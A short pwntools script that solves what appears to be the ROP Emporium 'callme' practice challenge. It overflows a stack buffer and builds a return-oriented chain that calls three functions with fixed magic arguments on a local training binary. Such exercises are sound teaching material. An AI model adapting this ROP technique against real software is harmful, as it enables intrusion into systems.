from pwn import *

#conn = gdb.debug('./callme')
conn = process('./callme')

payload = b'A' * 0x28
payload += p64(0x40093c) 
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400720)
payload += p64(0x40093c) 
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400740)
payload += p64(0x40093c) 
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x4006f0)

conn.sendlineafter('> ', payload)
conn.interactive()